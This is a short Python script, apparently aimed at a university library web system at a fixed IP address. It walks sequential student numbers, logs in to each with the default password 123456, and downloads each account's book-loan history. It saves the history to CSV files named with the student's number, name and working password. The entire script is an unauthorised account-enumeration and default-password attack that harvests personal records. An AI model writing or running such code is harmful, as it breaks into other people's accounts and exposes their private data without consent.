# coding: utf-8
# author: xz

import re, time
import requests

def getBooks(number, pwd):
    time.sleep(5)
    ssn = requests.session()
    a = 20120910
    b = 20160624
    loginPage = ssn.get("http://218.192.12.92/AutoLoginSystem.aspx?username=%s&password=%s" % (number, pwd))
    userNameTag = re.findall(r'<span id="LabUserName">.{2,4}</span>', loginPage.text)
    if len(userNameTag) > 0:
        fileName = ssn.get("http://218.192.12.92/NTBookLoanRetrAjaxPutInfo.aspx?Cmd=LoanLogCheck&begDate=%s&endDate=%s"
                           % (a, b)).text
        csvFilePage = ssn.get("http://218.192.12.92/tmp/%s" % fileName)
        userName = userNameTag[0][23:26].replace("<", "")
        print("saving %s's books" % userName)
        print(csvFilePage.text)
        open('books/%s(%s)[%s].csv' % (number, userName, pwd), "w", encoding="utf-8").write(csvFilePage.text)
    else:
        print("%s password unknown" % number)
        return number


if __name__ == "__main__":
    classToNum = {}
    for classNum in range(1215421, 1215424):
        list = [getBooks(i, 123456) for i in range(classNum * 100, classNum * 100 + 60)]
        classToNum[classNum] = list
